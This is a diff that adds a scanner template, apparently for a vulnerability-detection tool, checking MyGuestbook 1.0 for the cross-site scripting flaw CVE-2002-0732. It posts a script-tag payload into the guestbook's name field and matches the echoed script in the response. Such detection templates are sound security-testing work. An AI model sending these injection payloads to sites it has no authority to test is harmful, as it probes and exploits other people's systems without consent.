@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "检测 MyGuestbook 1.0 跨站脚本漏洞，通过在用户名称或评论字段注入恶意 HTML/JavaScript 代码验证漏洞存在"
+id = "POC-AVE-2002-0404"
+name = "MyGuestbook 1.0 XSS PoC"
+severity = "high"
+tags = [
+    "cve-2002-0732",
+    "xss",
+    "myguestbook",
+]
+vuln_id = [
+    "CVE-2002-0732",
+    "AVE-2002-0404",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/guestbook.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "name=<script>alert('XSS')</script>&email=test@test.com&comments=test&action=add"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
